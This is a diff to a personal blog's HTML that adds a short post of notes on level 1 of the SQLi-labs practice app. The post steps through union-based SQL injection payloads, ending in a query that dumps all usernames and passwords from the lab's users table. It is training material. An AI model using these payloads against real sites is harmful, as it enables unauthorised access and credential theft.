@@ -299,6 +299,170 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://busydebug.github.io/2017/12/11/Sqli-labs-Less-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="busydebug">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="besydebug">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/12/11/Sqli-labs-Less-1/" itemprop="url">Sqli-labs Less-1</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-11T22:49:32+08:00">
+                2017-12-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL-Injection/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL Injection</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL-Injection/SQLi-Labs/" itemprop="url" rel="index">
+                    <span itemprop="name">SQLi Labs</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <ul>
+<li>I test <strong>?id=1’</strong>, then return a error message showing that the sql statement using single quote</li>
+<li>so i change the sql statement to <strong>?id=1’ %23</strong>, it runs normally</li>
+<li>then test <strong>?id=1’ union select 1,2,3 %23</strong>, but return nothing useful</li>
+<li>because id is valid so the union statement cannot run, so i change the sql statement to <strong>?id=-1’ union select 1,2,3 %23</strong>, yeah, it return different data, we can see that the server just uses position 2 and 3</li>
+<li>let me try more useful sql, <strong>?id=-1’ union select 1,user(),database() %23</strong>, we can see that we get the user name and database name</li>
+<li>using database name we can get its tables name through inner database <strong>information_schema</strong></li>
+<li>try <strong>?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ %23</strong>, we get tables name of database <strong>security</strong></li>
+<li>to get more data, we can try getting data from table <strong>users</strong>, <strong>?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=’security’ and table_name=’users’ %23</strong>, we get columns name of table <strong>users</strong> in database <strong>security</strong></li>
+<li>finally we use <strong>?id=-1’ union select 1,group_concat(username, ‘:’),group_concat(password, ‘:’) from security.users %23</strong>, we get all username and password</li>
+<li>i just make notes so i don’t explain clearly, i’m sorry</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://busydebug.github.io/2017/12/11/Two-Sum/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -513,7 +677,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -524,7 +688,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
@@ -535,7 +699,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
